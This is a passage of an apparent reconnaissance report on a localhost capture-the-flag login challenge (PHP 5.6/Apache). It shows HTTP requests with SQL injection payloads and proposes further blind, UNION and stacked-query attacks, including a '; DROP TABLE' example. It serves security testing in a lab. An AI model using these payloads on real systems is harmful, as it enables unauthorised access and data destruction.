t:** 127.0.0.1:32989\\n- **Host / base URL:** http://127.0.0.1:32989\\n- **Application:** AUTH 03 Challenge (Simpsons/Springfield themed authentication challenge)\\n- **Authentication context:** Unauthenticated access to login form; no session cookies observed\\n- **Technology stack:**\\n  - Server: Apache/2.4.25 (Debian)\\n  - Application: PHP/5.6.40\\n  - Both versions are End-of-Life (EOL), suggesting potential security vulnerabilities\\n\\n---\\n\\n## Confirmed Findings\\n\\n### Login Form Discovery\\n- **Endpoint:** `POST /index.php`\\n- **Form action:** `index.php` (self-submitting)\\n- **Method:** POST\\n- **Parameters:**\\n  - `username` (type: text)\\n  - `password` (type: password)\\n\\n### Authentication Behavior Analysis\\n- **Silent failure pattern:** All login attempts return identical HTTP 200 responses with content-length: 1181\\n- **No error messages:** Application does not display authentication error messages\\n- **No session management:** No Set-Cookie headers detected in any response\\n- **Response uniformity:** Identical responses for valid test credentials, SQLi payload 1, and SQLi payload 2\\n\\n---\\n\\n## Steps to Reproduce (Reconnaissance)\\n\\n1. **Access main page:**\\n   ```\\n   GET http://127.0.0.1:32989/\\n   ```\\n   Observe AUTH 03 challenge page with Springfield/Simpsons theme and login form.\\n\\n2. **Test normal authentication:**\\n   ```\\n   POST /index.php HTTP/1.1\\n   Host: 127.0.0.1:32989\\n   Content-Type: application/x-www-form-urlencoded\\n   \\n   username=test&password=test\\n   ```\\n   Result: HTTP 200 OK, content-length: 1181\\n\\n3. **Test SQL injection payload 1:**\\n   ```\\n   POST /index.php HTTP/1.1\\n   Host: 127.0.0.1:32989\\n   Content-Type: application/x-www-form-urlencoded\\n   \\n   username=\' OR \'1\'=\'1\' --&password=test\\n   ```\\n   Result: HTTP 200 OK, content-length: 1181\\n\\n4. **Test SQL injection payload 2:**\\n   ```\\n   POST /index.php HTTP/1.1\\n   Host: 127.0.0.1:32989\\n   Content-Type: application/x-www-form-urlencoded\\n   \\n   username=admin\' OR \'1\'=\'1\'#&password=anything\\n   ```\\n   Result: HTTP 200 OK, content-length: 1181\\n\\n---\\n\\n## Validation / Evidence\\n\\n### Response Headers\\n```\\nHTTP/1.1 200 OK\\ndate: Thu, 02 Apr 2026 00:57:23 GMT\\nserver: Apache/2.4.25 (Debian)\\nx-powered-by: PHP/5.6.40\\ncontent-type: text/html; charset=UTF-8\\n```\\n\\n### Authentication Test Results\\n| Test Case | Payload | Response Status | Content-Length | Set-Cookie |\\n|-----------|---------|-----------------|----------------|------------|\\n| Normal test | username=test&password=test | HTTP 200 | 1181 | None |\\n| SQLi test 1 | username=\' OR \'1\'=\'1\' --&password=test | HTTP 200 | 1181 | None |\\n| SQLi test 2 | username=admin\' OR \'1\'=\'1\'#&password=anything | HTTP 200 | 1181 | None |\\n\\n### Observations\\n- All three test cases produced **identical responses** (same content-length)\\n- **No session establishment** via Set-Cookie headers in any response\\n- **Silent failure:** No visible error differentiation between failed login and SQLi attempts\\n- **Potential filtering:** Identical responses suggest either input sanitization or different injection technique required\\n\\n### Note on Validation Tokens\\n- **No token found:** No validation token, flag, or secret observed in responses\\n- This is expected as the objective was reconnaissance only, not exploitation\\n\\n---\\n\\n## Assessment & Intelligence\\n\\n### Vulnerability Indicators\\n1. **Outdated software stack:** Apache 2.4.25 and PHP 5.6.40 are EOL versions with known vulnerabilities\\n2. **Silent authentication failure:** Suggests custom error handling that may mask SQL injection behavior\\n3. **Identical response sizes:** Indicates either:\\n   - Input filtering/sanitization in place\\n   - Different SQL injection technique required\\n   - Blind SQL injection potential\\n\\n### Recommended Exploitation Vectors\\nBased on reconnaissance findings, the following techniques should be tested:\\n\\n1. **Boolean-based blind SQL injection:** Test for true/false condition differentiation\\n2. **Time-based SQL injection:** Use `SLEEP()` or `BENCHMARK()` delays\\n3. **Alternative comment styles:** Test `-- -`, `/* */`, or omitting comments entirely\\n4. **Alternative quote handling:** Test without quotes, double quotes, or backslash escaping\\n5. **Stacked queries:** Test `; DROP TABLE` or other multi-statement techniques (if supported)\\n6. **UNION-based injection:** Probe for UNION SELECT opportunities\\n\\n---\\n\\n## How to Verify (Next Steps)\\n\\n1. **Test for time-based blind SQLi:**\\n   ```\\n   username=test\' AND SLEEP(5)-- -&password=test\\n   ```\\n   Observe if response time increases by ~5 seconds.\\n\\n2. **Test boolean-based blind SQLi:**\\n   ```\\n   username=test\' AND \'1\'=\'1\'-- -&password=test\\n   username=test\' AND \'1\'=\'2\'-- -&password=test\\n   ```\\n   Compare response content-lengths for differences.\\n\\n3. **Test without comment:**\\n   ```\\n   username=\' OR \'1\'=\'1\' OR \'&password=test\\n   ```\\n   Attempt to close the query naturally without comment characters.\\n\\n---\\n\\n## Remaining Leads\\n\\n### Confirmed Blockers\\n- Basic SQLi payloads (`\' OR \'1\'=\'1\' --` and `admin\' OR \'1\'=\'1\'#`) did not produce authentication bypass with tested syntax\\n- No direct error messages visible to aid SQLi construction\\n\\n### Unverified Leads\\n- **Filter bypass potential:** Application may be filtering specific keywords (`OR`, `AND`, `--`, `#`) or quote characters\\n- **Alternative injection points:** Password field may have different filtering than username field\\n- **HTTP parameter pollution:** Testing duplicate parameters may reveal parsing inconsistencies\\n- **Encoding bypasses:** URL encoding, double encoding, or Unicode normalization may bypass filters\\n\\n### Missing Context\\n- Source code of authentication logic not available\\n- Database type and version unknown (MySQL, PostgreSQL,